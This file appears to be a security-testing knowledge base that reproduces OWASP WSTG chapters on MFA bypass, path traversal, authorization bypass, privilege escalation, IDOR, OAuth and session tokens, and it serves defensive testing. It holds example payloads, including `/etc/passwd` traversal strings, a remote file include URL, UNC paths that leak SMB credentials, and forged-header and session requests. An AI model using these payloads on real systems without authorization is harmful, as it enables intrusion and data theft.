    It's worth noting that requiring multiple examples of a single factor (such as needing both a password and a PIN) **does not constitute MFA**, although it may provide some security benefits over a simple password, and may be considered two-step verification (2SV).

    Due to the complexity of implementing biometrics in a browser-based environment, "Something You Are" is rarely used for web applications, although it is starting to be adopted using standards such as WebAuthn. The most common second factor is "Something You Have".

    ### Check for MFA Bypasses

    The first step for testing MFA is to identify all of the authentication functionality in the application, which may include:

    - The main login page.
    - Security critical functionality (such as disabling MFA or changing a password).
    - Federated login providers.
    - API endpoints (from both the main web interface and mobile apps).
    - Alternative (non-HTTP) protocols.
    - Test or debug functionality.

    All of the different login methods should be reviewed, to ensure that MFA is enforced consistently. If some methods do not require MFA, then these can provide a simple method to bypass them.

    If the authentication is done in multiple steps then it may be possible to bypass it by completing the first step of the authentication process (entering the username and password), and then force-browsing to the application or making direct API requests without completing the second stage (entering the MFA code).

    If the authentication is using a OpenID Connect (OIDC) provider that allows custom authentication flows (or policies) such as Azure B2C, there may be multiple flows defined, some of which may not require MFA. For example if the application authenticates with a flow called `B2C_1_SignInWithMFA`, then try tampering that to `B2C_1_SignIn`, `B2C_1_SignInWithoutMFA` or other similar values.

    In some cases, there may also be intentional MFA bypasses implemented, such as not requiring MFA:

    - From specific IP addresses (which may be spoofable using the `X-Forwarded-For` HTTP header).
    - When a specific HTTP header is set (such as a non-standard header like `X-Debug`).
    - For a specific hard-coded account (such as a "root" or "breakglass" account).

    Where an application supports both local and federated logins, it may be possible to bypass the MFA if there is no strong separation between these two types of accounts. For example, if a user registers a local account and configures MFA for it, but does not have MFA configured on their account on the federated login provider, it may be possible for an attacker to re-register (or link) a federated account on the target application with the same email address by compromising the user's account on the federated login provider.

    Finally, if the MFA is implemented on a different system to the main application (such as on a reverse proxy, in order to protect a legacy application that does not natively support MFA), then it may be possible to bypass it by connecting directly to the backend application server, as discussed in the guide on how to [map the application architecture](../01-Information_Gathering/10-Map_Application_Architecture.md#content-delivery-network-cdn).

    ### Check MFA Management

    The functionality used to manage MFA from inside the user's account should be tested for vulnerabilities, including:

    - Is the user required to re-authenticate to remove or change MFA settings?
    - Is the MFA management functionality vulnerable to [cross-site request forgery](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md)?
    - Can other users' MFA setting be modified through [IDOR vulnerabilities](../05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md)?

    ### Check MFA Recovery Options

    Many applications will provide users with a way to regain access to their account if they are unable to authenticate with their second factor (for example if they have lost their phone). These mechanisms can often represent a significant weakness in the application, as they effectively allow the second authentication factor to be bypassed.

    #### Recovery Codes

    Some applications will provide the user with a list of recovery or backup codes when they enable MFA, which can be used to login. These should be checked to ensure:

    - They are sufficiently long and complex to protect against brute-force attacks.
    - They are securely generated.
    - They can only be used once.
    - Brute-force protection is in place (such as account lockout).
    - The user is notified (via email, SMS, etc) when a code is used.

    See the ["Backup Codes" section in the Forgotten Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html#backup-codes) for further details.

    #### MFA Reset Process

    If the application implements an MFA reset process, this should be tested in the same way that the [password reset process](09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md) is tested. It is important that this process is *at least* as strong as the MFA implementation for the application.

    #### Alternative Authentication

    Some applications will allow the user to prove their identity through other means, such as the use of [security questions](08-Testing_for_Weak_Security

    _(truncated — see the full WSTG test)_
- title: WSTG-ATHZ-01 Testing Directory Traversal File Include
  service: http
  tech: authz
  doc_kind: wstg
  content: |-
    ## WSTG-ATHZ-01 — Testing Directory Traversal File Include

    Category: 05-Authorization_Testing  
    Source: OWASP WSTG (WSTG-ATHZ-01) — CC BY-SA 4.0

    Many web applications use and manage files as part of their daily operation. Using input validation methods that have not been well designed or deployed, an aggressor could exploit the system in order to read or write files that are not intended to be accessible. In particular situations, it could be possible to execute arbitrary code or system commands.

    ### Test Objectives

    - Identify injection points that pertain to path traversal.
    - Assess bypassing techniques and identify the extent of path traversal.

    ### How to Test

    ### Black-Box Testing

    #### Input Vectors Enumeration

    In order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to enumerate all parts of the application that accept content from the user. This also includes HTTP GET and POST queries and common options like file uploads and HTML forms.

    Here are some examples of the checks to be performed at this stage:

    - Are there request parameters which could be used for file-related operations?
    - Are there unusual file extensions?
    - Are there interesting variable names?
        - `https://example.com/getUserProfile.jsp?item=ikki.html`
        - `https://example.com/index.php?file=content`
        - `https://example.com/main.cgi?home=index.htm`
    - Is it possible to identify cookies used by the web application for the dynamic generation of pages or templates?
        - `Cookie: ID=d9ccd3f4f9f18cc1:TM=2166255468:LM=1162655568:S=3cFpqbJgMSSPKVMV:TEMPLATE=flower`
        - `Cookie: USER=1826cc8f:PSTYLE=GreenDotRed`

    #### Testing Techniques

    The next stage of testing is analyzing the input validation functions present in the web application. Using the previous example, the dynamic page called `getUserProfile.jsp` loads static information from a file and shows the content to users. An attacker could insert the malicious string `../../../../etc/passwd` to include the password hash file of a Linux/UNIX system. Obviously, this kind of attack is possible only if the validation checkpoint fails; according to the file system privileges, the web application itself must be able to read the file.

    > Note: To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting `/etc/passwd` from an IIS web server.

    ```text
    https://example.com/getUserProfile.jsp?item=../../../../etc/passwd
    ```

    Another common example is including content from an external source:

    ```text
    https://example.com/index.php?file=https://www.owasp.org/malicioustxt
    ```

    The same can be applied to cookies or any other input vector that is used for dynamic page generation.

    More file inclusion payloads can be found at [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

    It is important to note that different operating systems use different path separators

    - Unix-like OS:
        - root directory: `/`
        - directory separator: `/`
    - Windows OS:
        - root directory: `<drive letter>:`
        - directory separator: `\` or `/`
    - Classic macOS:
        - root directory: `<drive letter>:`
        - directory separator: `:`

    It's a common mistake by developers to not expect every form of encoding and therefore only do validation for basic encoded content. If at first the test string isn't successful, try another encoding scheme.

    You can find encoding techniques and ready to use directory traversal payloads at [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)

    #### Windows Specific Considerations

    - Windows shell: Appending any of the following to paths used in a shell command results in no difference in function:
        - Angle brackets `<` and `>` at the end of the path
        - Double quotes (closed properly) at the end of the path
        - Extraneous current directory markers such as `./` or `.\\`
        - Extraneous parent directory markers with arbitrary items that may or may not exist:
            - `file.txt`
            - `file.txt...`
            - `file.txt<spaces>`
            - `file.txt""""`
            - `file.txt<<<>>><`
            - `./././file.txt`
            - `nonexistant/../file.txt`
    - Windows API: The following items are discarded when used in any shell command or API call where a string is taken as a filename:
        - periods
        - spaces
    - Windows UNC Filepaths: Used to reference files on SMB shares. Sometimes, an application can be made to refer to files on a remote UNC filepath. If so, the Windows SMB server may send stored credentials to the attacker, which can be captured and cracked. These may also be used with a self-referential IP address or domain name to evade filters, or used to access files on SMB shares inaccessible to the attacker, but accessible from the web server.
        - `\\server_or_ip\path\to\file.abc`
        - `\\?\server_or_ip\path\to\file.abc`
    - Windows NT Device Namespace: Used to refer to the Windows device namespace. Certain references will allow access to file systems using a different path.
        - May be equivalent to a drive letter such as `c:\`, or even a drive volume without an assigned letter: `\\.\GLOBALROOT\Device\HarddiskVolume1\`
        - Refers to the first disc drive on the machine: `\\.\CdRom0\`

    ### Gray-Box Testing

    When the analysis is performed with a gray-box testing approach, testers have to follow the same methodology as in black-box testing. However, since they can review the source code, it is possible to search the input vectors more easily and accurately. During a source code review, they can use simple tools (such as the *grep* command) to search for one or more common patterns within the application code: inclusion functions/methods, filesystem operations, and so on.

    - `PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...`
    - `JSP/Servlet: java.io.File(), java.io.FileReader(), ...`
    - `ASP: include file, include virtual, ...`

    Using online code search engines (e.g., [Searchcode](https://searchcode.com/)), it may also be possible to find path traversal flaws in Open Source software published on the internet.

    For PHP, testers can use the following regular expression:

    ```text
    (include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)
    ```

    Using the gray-box testing method, it is possible to discover vulnerabilities that are usually harder to discover, or even impossible to find during a standard black-box assessment.

    Some web applications generate dynamic pages using values a

    _(truncated — see the full WSTG test)_
- title: WSTG-ATHZ-02 Testing for Bypassing Authorization Schema
  service: http
  tech: authz
  doc_kind: wstg
  content: |-
    ## WSTG-ATHZ-02 — Testing for Bypassing Authorization Schema

    Category: 05-Authorization_Testing  
    Source: OWASP WSTG (WSTG-ATHZ-02) — CC BY-SA 4.0

    This test case focuses on identifying authorization weaknesses where an authenticated
    user is able to access resources or perform actions beyond their assigned permissions,
    including horizontal and vertical privilege escalation.

    ### Test Objectives

    - Assess if unauthenticated, horizontal, or vertical access is possible.

    ### How to Test

    - Access resources and conduct operations without login. - Direct page request ([forced browsing](https://owasp.org/www-community/attacks/Forced_browsing))
    - Access resources and conduct operations horizontally.
    - Access resources and conduct operations vertically.

    ### Testing for Basic Unauthenticated Access

    #### Using a Browser Manually

    When a web application does not properly enforce access control mechanisms, sensitive resources become exposed, allowing unauthenticated users to view them. For example, if a user directly requests a different page via forced browsing, that page may not check the authorization of the anonymous user before granting access. Attempt to directly access a protected page through the address bar in your browser to test using this method.

    ![Direct Request to Protected Page](images/Basm-directreq.jpg)\
    *Figure 4.5.2-1: Direct Request to Protected Page*

    #### Using Automation

    This process can be automated if you have a list of all endpoints with tools like ffuf, gobuster, ZAP, and Burp Suite Intruder.

    For ZAP, using an add-on for [Access Control Testing](https://www.zaproxy.org/docs/desktop/addons/access-control-testing/) allows testers to determine which parts of the application are available to anonymous users, and identify potential access control issues.

    For Burp Suite, built-in tools such as Intruder, and a number of plugins, including Autorize, help the tester automate testing authorization.

    ### Testing for Horizontal Bypassing Authorization Schema

    For every function, specific role, or request that the application executes, it is necessary to verify:

    - Is it possible to access resources that should be accessible to a user that holds a different identity with the same role or privilege?
    - Is it possible to operate functions on resources that should be accessible to a user that holds a different identity?

    For each role:

    1. Register or generate two users with identical privileges.
    2. Establish and keep two different sessions active (one for each user).
    3. For every request, change the relevant parameters and the session identifier from token one to token two and diagnose the responses for each token.
    4. An application will be considered vulnerable if the responses are the same, contain same private data or indicate successful operation on other users' resource or data.

    For example, suppose that the `viewSettings` function is part of every account menu of the application with the same role, and it is possible to access it by requesting the following URL: `https://www.example.com/account/viewSettings`. Then, the following HTTP request is generated when calling the `viewSettings` function:

    ```http
    POST /account/viewSettings HTTP/1.1
    Host: www.example.com
    [other HTTP headers]
    Cookie: SessionID=USER_SESSION

    username=example_user
    ```

    Valid and legitimate response:

    ```html
    HTTP1.1 200 OK
    [other HTTP headers]

    {
      "username": "example_user",
      "email": "example@email.com",
      "address": "Example Address"
    }
    ```

    The attacker may try and execute that request with the same `username` parameter:

    ```html
    POST /account/viewCCpincode HTTP/1.1
    Host: www.example.com
    [other HTTP headers]
    Cookie: SessionID=ATTACKER_SESSION

    username=example_user
    ```

    If the attacker's response contain the data of the `example_user`, then the application is vulnerable for lateral movement attacks, where a user can read or write other user's data.

    ### Testing for Access to Administrative Functions

    For example, suppose that the `addUser` function is part of the administrative menu of the application, and it is possible to access it by requesting the following URL `https://www.example.com/admin/addUser`.

    Then, the following HTTP request is generated when calling the `addUser` function:

    ```http
    POST /admin/addUser HTTP/1.1
    Host: www.example.com
    [...]

    userID=fakeuser&role=3&group=grp001
    ```

    Further questions or considerations would go in the following direction:

    - What happens if a non-administrative user tries to execute that request?
    - Will the user be created?
    - If so, can the new user use their privileges?

    ### Testing for Access to Resources Assigned to a Different Role

    Various applications setup resource controls based on user roles. Let's take an example resumes or CVs (curriculum vitae) uploaded on a careers form to an S3 bucket.

    As a normal user, try accessing the location of those files. If you are able to retrieve them, modify them, or delete them, then the application is vulnerable.

    ### Testing for Special Request Header Handling

    Some applications support non-standard headers such as `X-Original-URL` or `X-Rewrite-URL` in order to allow overriding the target URL in requests with the one specified in the header value.

    This behavior can be leveraged in a situation in which the application is behind a component that applies access control restriction based on the request URL.

    The kind of access control restriction based on the request URL can be, for example, blocking access from internet to an administration console exposed on `/console` or `/admin`.

    To detect the support for the header `X-Original-URL` or `X-Rewrite-URL`, the following steps can be applied.

    #### 1. Send a Normal Request without Any X-Original-Url or X-Rewrite-Url Header

    ```http
    GET / HTTP/1.1
    Host: www.example.com
    [...]
    ```

    #### 2. Send a Request with an X-Original-Url Header Pointing to a Non-Existing Resource

    ```html
    GET / HTTP/1.1
    Host: www.example.com
    X-Original-URL: /donotexist1
    [...]
    ```

    #### 3. Send a Request with an X-Rewrite-Url Header Pointing to a Non-Existing Resource

    ```html
    GET / HTTP/1.1
    Host: www.example.com
    X-Rewrite-URL: /donotexist2
    [...]
    ```

    If the response for either request contains markers that the resource was not found, this indicates that the application supports the special request headers. These markers may include the HTTP response status code 404, or a "resource not found" message in the response body.

    Once the support for the header `X-Original-URL` or `X

    _(truncated — see the full WSTG test)_
- title: WSTG-ATHZ-03 Testing for Privilege Escalation
  service: http
  tech: authz
  doc_kind: wstg
  content: |-
    ## WSTG-ATHZ-03 — Testing for Privilege Escalation

    Category: 05-Authorization_Testing  
    Source: OWASP WSTG (WSTG-ATHZ-03) — CC BY-SA 4.0

    This section describes the issue of escalating privileges from one stage to another. During this phase, the tester should verify that it is not possible for a user to modify their privileges or roles inside the application in ways that could allow privilege escalation attacks.

    ### Test Objectives

    - Identify injection points related to privilege manipulation.
    - Fuzz or otherwise attempt to bypass security measures.

    ### How to Test

    ### Testing for Role/Privilege Manipulation

    In every portion of the application where a user can create information in the database (e.g., making a payment, adding a contact, or sending a message), can receive information (statement of account, order details, etc.), or delete information (drop users, messages, etc.), it is necessary to record that functionality. The tester should try to access such functions as another user in order to verify if it is possible to access a function that should not be permitted by the user's role/privilege (but might be permitted as another user).

    #### Manipulation of User Group

    For example:
    The following HTTP POST allows the user that belongs to `grp001` to access order #0001:

    ```http
    POST /user/viewOrder.jsp HTTP/1.1
    Host: www.example.com
    ...

    groupID=grp001&orderID=0001
    ```

    Verify if a user that does not belong to `grp001` can modify the value of the parameters `groupID` and `orderID` to gain access to that privileged data.

    #### Manipulation of User Profile

    For example:
    The following server's answer shows a hidden field in the HTML returned to the user after a successful authentication.

    ```html
    HTTP/1.1 200 OK
    Server: Netscape-Enterprise/6.0
    Date: Wed, 1 Apr 2006 13:51:20 GMT
    Set-Cookie: USER=aW78ryrGrTWs4MnOd32Fs51yDqp; path=/; domain=www.example.com
    Set-Cookie: SESSION=k+KmKeHXTgDi1J5fT7Zz; path=/; domain= www.example.com
    Cache-Control: no-cache
    Pragma: No-cache
    Content-length: 247
    Content-Type: text/html
    Expires: Thu, 01 Jan 1970 00:00:00 GMT
    Connection: close

    <form  name="autoriz" method="POST" action = "visual.jsp">
    <input type="hidden" name="profile" value="SysAdmin">\

    <body onload="document.forms.autoriz.submit()">
    </td>
    </tr>
    ```

    What if the tester modifies the value of the variable `profile` to `SysAdmin`? Is it possible to become **administrator**?

    #### Manipulation of Condition Value

    For example:
    In an environment where the server sends an error message contained as a value in a specific parameter in a set of answer codes, as the following:

    ```text
    @0`1`3`3``0`UC`1`Status`OK`SEC`5`1`0`ResultSet`0`PVValid`-1`0`0` Notifications`0`0`3`Command  Manager`0`0`0` StateToolsBar`0`0`0`
    StateExecToolBar`0`0`0`FlagsToolBar`0
    ```

    The server gives an implicit trust to the user. It believes that the user will answer with the above message closing the session.

    In this condition, verify that it is not possible to escalate privileges by modifying the parameter values. In this particular example, by modifying the `PVValid` value from `-1` to `0` (no error conditions), it may be possible to authenticate as administrator to the server.

    #### Manipulation of IP Address

    Some sites limit access or count the number of failed login attempts based on IP address.

    For example:

    ```text
    X-Forwarded-For: 8.1.1.1
    ```

    In this case, if the site uses the value of `X-forwarded-For` as client IP address, tester may change the IP value of the `X-forwarded-For` HTTP header to workaround the IP source identification.

    ### Testing for Vertical Bypassing Authorization Schema

    A vertical authorization bypass is specific to the case that an attacker obtains a role higher than their own. Testing for this bypass focuses on verifying how the vertical authorization schema has been implemented for each role. For every function, page, specific role, or request that the application executes, it is necessary to verify if it is possible to:

    - Access resources that should be accessible only to a higher role user.
    - Operate functions on resources that should be operative only by a user that holds a higher or specific role identity.

    For each role:

    1. Register a user.
    2. Establish and maintain two different sessions based on the two different roles.
    3. For every request, change the session identifier from the original to another role's session identifier and evaluate the responses for each.
    4. An application will be considered vulnerable if the weaker privileged session contains the same data, or indicate successful operations on higher privileged functions.

    #### Banking Site Roles Scenario

    The following table illustrates the system roles on a banking site. Each role binds with specific permissions for the event menu functionality:

    |      ROLE     |     PERMISSION    | ADDITIONAL PERMISSION |
    |---------------|-------------------|-----------------------|
    | Administrator | Full Control      | Delete                |
    | Manager       | Modify, Add, Read | Add                   |
    | Staff         | Read, Modify      | Modify                |
    | Customer      | Read Only         |                       |

    The application will be considered vulnerable if the:

    1. Customer could operate administrator, manager or staff functions;
    2. Staff user could operate manager or administrator functions;
    3. Manager could operate administrator functions.

    Suppose that the `deleteEvent` function is part of the administrator account menu of the application, and it is possible to access it by requesting the following URL: `https://www.example.com/account/deleteEvent`. Then, the following HTTP request is generated when calling the `deleteEvent` function:

    ```http
    POST /account/deleteEvent HTTP/1.1
    Host: www.example.com
    [other HTTP headers]
    Cookie: SessionID=ADMINISTRATOR_USER_SESSION

    EventID=1000001
    ```

    The valid response:

    ```http
    HTTP/1.1 200 OK
    [other HTTP headers]

    {"message": "Event was deleted"}
    ```

    The attacker may try and execute the same request:

    ```http
    POST /account/deleteEvent HTTP/1.1
    Host: www.example.com
    [other HTTP headers]
    Cookie: SessionID=CUSTOMER_USER_SESSION

    EventID=1000002
    ```

    If the response of the attacker’s request contains the same data `{"message": "Event was deleted"}` the application is vulnerable.

    #### Administrator Page Access

    Suppose that the administrator menu is part of the administrator account.

    The application will be considered vulnerable if any role other than administrator could access the administrator menu. Sometimes, developers perform authorization v

    _(truncated — see the full WSTG test)_
- title: WSTG-ATHZ-04 Testing for Insecure Direct Object References
  service: http
  tech: authz
  doc_kind: wstg
  content: |-
    ## WSTG-ATHZ-04 — Testing for Insecure Direct Object References

    Category: 05-Authorization_Testing  
    Source: OWASP WSTG (WSTG-ATHZ-04) — CC BY-SA 4.0

    Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files.
    Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more. This is caused by the fact that the application takes user supplied input and uses it to retrieve an object without performing sufficient authorization checks.

    ### Test Objectives

    - Identify points where object references may occur.
    - Assess the access control measures and if they're vulnerable to IDOR.

    ### How to Test

    To test for this vulnerability the tester first needs to map out all locations in the application where user input is used to reference objects directly. For example, locations where user input is used to access a database row, a file, application pages and more. Next the tester should modify the value of the parameter used to reference objects and assess whether it is possible to retrieve objects belonging to other users or otherwise bypass authorization.

    The best way to test for direct object references would be by having at least two (often more) users to cover different owned objects and functions. For example two users each having access to different objects (such as purchase information, private messages, etc.), and (if relevant) users with different privileges (for example administrator users) to see whether there are direct references to application functionality. By having multiple users the tester saves valuable testing time in guessing different object names as he can attempt to access objects that belong to the other user.

    Below are several typical scenarios for this vulnerability and the methods to test for each:

    ### The Value of a Parameter Is Used Directly to Retrieve a Database Record

    Sample request:

    ```text
    https://foo.bar/somepage?invoice=12345
    ```

    In this case, the value of the *invoice* parameter is used as an index in an invoices table in the database. The application takes the value of this parameter and uses it in a query to the database. The application then returns the invoice information to the user.

    Since the value of *invoice* goes directly into the query, by modifying the value of the parameter it is possible to retrieve any invoice object, regardless of the user to whom the invoice belongs. To test for this case the tester should obtain the identifier of an invoice belonging to a different test user (ensuring he is not supposed to view this information per application business logic), and then check whether it is possible to access objects without authorization.

    ### The Value of a Parameter Is Used Directly to Perform an Operation in the System

    Sample request:

    ```text
    https://foo.bar/changepassword?user=someuser
    ```

    In this case, the value of the `user` parameter is used to tell the application for which user it should change the password. In many cases this step will be a part of a wizard, or a multi-step operation. In the first step the application will get a request stating for which user's password is to be changed, and in the next step the user will provide a new password (without asking for the current one).

    The `user` parameter is used to directly reference the object of the user for whom the password change operation will be performed. To test for this case the tester should attempt to provide a different test username than the one currently logged in, and check whether it is possible to modify the password of another user.

    ### The Value of a Parameter Is Used Directly to Retrieve a File System Resource

    Sample request:

    ```text
    https://foo.bar/showImage?img=img00011
    ```

    In this case, the value of the `file` parameter is used to tell the application what file the user intends to retrieve. By providing the name or identifier of a different file (for example file=image00012.jpg) the attacker will be able to retrieve objects belonging to other users.

    To test for this case, the tester should obtain a reference the user is not supposed to be able to access and attempt to access it by using it as the value of `file` parameter. Note: This vulnerability is often exploited in conjunction with a directory/path traversal vulnerability (see [Testing for Path Traversal](01-Testing_Directory_Traversal_File_Include.md))

    ### The Value of a Parameter Is Used Directly to Access Application Functionality

    Sample request:

    ```text
    https://foo.bar/accessPage?menuitem=12
    ```

    In this case, the value of the `menuitem` parameter is used to tell the application which menu item (and therefore which application functionality) the user is attempting to access. Assume the user is supposed to be restricted and therefore has links available only to access to menu items 1, 2 and 3. By modifying the value of `menuitem` parameter it is possible to bypass authorization and access additional application functionality. To test for this case the tester identifies a location where application functionality is determined by reference to a menu item, maps the values of menu items the given test user can access, and then attempts other menu items.

    In the above examples the modification of a single parameter is sufficient. However, sometimes the object reference may be split between more than one parameter, and testing should be adjusted accordingly.
- title: WSTG-ATHZ-05 Testing for OAuth Weaknesses
  service: http
  tech: authz
  doc_kind: wstg
  content: |-
    ## WSTG-ATHZ-05 — Testing for OAuth Weaknesses

    Category: 05-Authorization_Testing  
    Source: OWASP WSTG (WSTG-ATHZ-05) — CC BY-SA 4.0

    [OAuth2.0](https://oauth.net/2/) (hereinafter referred to as OAuth) is an authorization framework that allows a client to access resources on the behalf of its user.

    ### Test Objectives

    - Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.

    ### How to Test

    ### Testing for Deprecated Grant Types

    Deprecated grant types were obsoleted for security and functionality reasons. Identifying if they're being used allows us to quickly review if they're susceptible to any of the threats pertaining to their usage. Some might be out of scope to the attacker, such as the way a client might be using the users' credentials. This should be documented and raised to the internal engineering teams.

    For public clients, it is generally possible to identify the grant type in the request to the `/token` endpoint. It is indicated in the token exchange with the parameter `grant_type`.

    The following example shows the Authorization Code grant with PKCE.

    ```http
    POST /oauth/token HTTP/1.1
    Host: as.example.com
    [...]

    {
      "client_id":"example-client",
      "code_verifier":"example",
      "grant_type":"authorization_code",
      "code":"example",
      "redirect_uri":"https://client.example.com"
    }
    ```

    The values for the `grant_type` parameter and the grant type they indicate are:

    - `password`: Indicates the ROPC grant.
    - `client_credentials`: Indicates the Client Credential grant.
    - `authorization_code`: Indicates the Authorization Code grant.

    The Implicit Flow type is not indicated by the `grant_type` parameter since the token is presented in the response to the `/authorization` endpoint request, and instead can be identified through the `response_type`. Below is an example.

    ```http
    GET /authorize
      ?client_id=<some_client_id>
      &response_type=token 
      &redirect_uri=https%3A%2F%2Fclient.example.com%2F
      &scope=openid%20profile%20email
      &state=<random_state>
    ```

    The following URL parameters indicate the OAuth flow being used:

    - `response_type=token`: Indicates Implicit Flow, as the client is directly requesting from the authorization server to return a token.
    - `response_type=code`: Indicates Authorization Code flow, as the client is requesting from the authorization server to return a code, that will be exchanged afterwards with a token.
    - `code_challenge=sha256(xyz)`: Indicates the PKCE extension, as no other flow uses this parameter.

    The following is an example authorization request for Authorization Code flow with PKCE:

    ```http
    GET /authorize
        ?redirect_uri=https%3A%2F%2Fclient.example.com%2F
        &client_id=<some_client_id>
        &scope=openid%20profile%20email
        &response_type=code
        &response_mode=query
        &state=<random_state>
        &nonce=<random_nonce>
        &code_challenge=<random_code_challenge>
        &code_challenge_method=S256 HTTP/1.1
    Host: as.example.com
    [...]
    ```

    #### Public Clients

    The Authorization Code grant with PKCE extension is recommended for public clients. An authorization request for Authorization Code flow with PKCE should contain `response_type=code` and `code_challenge=sha256(xyz)`.

    The token exchange should contain the grant type `authorization_code` and a `code_verifier`.

    Improper grant types for public clients are:

    - Authorization Code grant without the PKCE extension
    - Client Credentials
    - Implicit Flow
    - ROPC

    #### Confidential Clients

    The Authorization Code grant is recommended for confidential clients. The PKCE extension may be used as well.

    Improper grant types for confidential clients are:

    - Client Credentials (Except for machine-to-machine -- see below)
    - Implicit Flow
    - ROPC

    ##### Machine-to-Machine

    In situations where no user interaction occurs and the clients are only confidential clients, the Client Credentials grant may be used.

    If you know the `client_id` and `client_secret`, it is possible to obtain a token by passing the `client_credentials` grant type.

    ```bash
    $ curl --request POST \
      --url https://as.example.com/oauth/token \
      --header 'content-type: application/json' \
      --data '{"client_id":"<some_client_id>","client_secret":"<some_client_secret>","grant_type":"client_credentials"}' --proxy https://localhost:8080/ -k
    ```

    ### Credential Leakage

    Depending on the flow, OAuth transports several types of credentials in as URL parameters.

    The following tokens can be considered to be leaked credentials:

    - access token
    - refresh token
    - authorization code
    - PKCE code challenge / code verifier

    Due to how OAuth works, the authorization `code` as well as the `code_challenge`, and `code_verifier` may be part of the URL. The implicit flow transports the authorization token as part of the URL if the `response_mode` is not set to [`form_post`](https://openid.net/specs/oauth-v2-form-post-response-mode-1_0.html). This may lead to leakage of the requested token or code in the referrer header, in log files, and proxies due to these parameters being passed either in the query or the fragment.

    The risk that's carried by the implicit flow leaking the tokens is far higher than leaking the `code` or any other `code_*` parameters, as they are bound to specific clients and are harder to abuse in case of leakage.

    In order to test this scenario, make use of an HTTP intercepting proxy such as ZAP and intercept the OAuth traffic.

    - Step through the authorization process and identify any credentials present in the URL.
    - If any external resources are included in a page involved with the OAuth flow, analyze the request made to them. Credentials could be leaked in the referrer header.

    After stepping through the OAuth flow and using the application, a few requests are captured in the request history of an HTTP intercepting proxy. Search for the HTTP referrer header (e.g. `Referer: https://idp.example.com/`) containing the authorization server and client URL in the request history.

    Reviewing the HTML meta tags (although this tag is [not supported](https://caniuse.com/mdn-html_elements_meta_name_referrer) on all browsers), or the [Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) could help assess if any credential leakage is happening through the referrer header.
- title: WSTG-SESS-01 Testing for Session Management Schema
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-01 — Testing for Session Management Schema

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-01) — CC BY-SA 4.0

    One of the core components of any web-based application is the mechanism by which it controls and maintains the state for a user interacting with it. To avoid continuous authentication for each page of a site or service, web applications implement various mechanisms to store and validate credentials for a pre-determined timespan. These mechanisms are known as Session Management.

    ### Test Objectives

    - Gather session tokens, for the same user and for different users where possible.
    - Analyze and ensure that enough randomness exists to stop session forging attacks.
    - Modify cookies that are not signed and contain information that can be manipulated.

    ### How to Test

    ### Black-Box Testing and Examples

    All interaction between the client and application should be tested at least against the following criteria:

    - Are all `Set-Cookie` directives tagged as `Secure`?
    - Do any Cookie operations take place over unencrypted transport?
    - Can the Cookie be forced over unencrypted transport?
    - If so, how does the application maintain security?
    - Are any Cookies persistent?
    - What `Expires` times are used on persistent cookies, and are they reasonable?
    - Are cookies that are expected to be transient configured as such?
    - What HTTP/1.1 `Cache-Control` settings are used to protect Cookies?
    - What HTTP/1.0 `Cache-Control` settings are used to protect Cookies?

    #### Cookie Collection

    The first step required to manipulate the cookie is to understand how the application creates and manages cookies. For this task, testers have to try to answer the following questions:

    - How many cookies are used by the application?

      Surf the application. Note when cookies are created. Make a list of received cookies, the page that sets them (with the set-cookie directive), the domain for which they are valid, their value, and their characteristics.

    - Which parts of the application generate or modify the cookie?

      Surfing the application, find which cookies remain constant and which get modified. What events modify the cookie?

    - Which parts of the application require this cookie in order to be accessed and utilized?

      Find out which parts of the application need a cookie. Access a page, then try again without the cookie, or with a modified value of it. Try to map which cookies are used where.

    A spreadsheet mapping each cookie to the corresponding application parts and the related information can be a valuable output of this phase.

    #### Session Analysis

    The session tokens (Cookie, SessionID or Hidden Field) themselves should be examined to ensure their quality from a security perspective. They should be tested against criteria such as their randomness, uniqueness, resistance to statistical and cryptographic analysis and information leakage.

    - Token Structure & Information Leakage

    The first stage is to examine the structure and content of a Session ID provided by the application. A common mistake is to include specific data in the Token instead of issuing a generic value and referencing real data server-side.

    If the Session ID is clear-text, the structure and pertinent data may be immediately obvious such as `192.168.100.1:owaspuser:password:15:58`.

    If part or the entire token appears to be encoded or hashed, it should be compared to various techniques to check for obvious obfuscation. For example the string `192.168.100.1:owaspuser:password:15:58` is represented in hex, base64, and as an MD5 hash:

    - Hex: `3139322E3136382E3130302E313A6F77617370757365723A70617373776F72643A31353A3538`
    - Base64: `MTkyLjE2OC4xMDAuMTpvd2FzcHVzZXI6cGFzc3dvcmQ6MTU6NTg=`
    - MD5: `01c2fc4f0a817afd8366689bd29dd40a`

    Having identified the type of obfuscation, it may be possible to decode back to the original data. In most cases, however, this is unlikely. Even so, it may be useful to enumerate the encoding in place from the format of the message. Furthermore, if both the format and obfuscation technique can be deduced, automated brute-force attacks could be devised.

    Hybrid tokens may include information such as IP address or User ID together with an encoded portion, such as `owaspuser:192.168.100.1:a7656fafe94dae72b1e1487670148412`.

    Having analyzed a single session token, the representative sample should be examined. A simple analysis of the tokens should immediately reveal any obvious patterns. For example, a 32 bit token may include 16 bits of static data and 16 bits of variable data. This may indicate that the first 16 bits represent a fixed attribute of the user – e.g. the username or IP address. If the second 16 bit chunk is incrementing at a regular rate, it may indicate a sequential or even time-based element to the token generation. See examples.

    If static elements to the Tokens are identified, further samples should be gathered, varying one potential input element at a time. For example, log in attempts through a different user account or from a different IP address may yield a variance in the previously static portion of the session token.

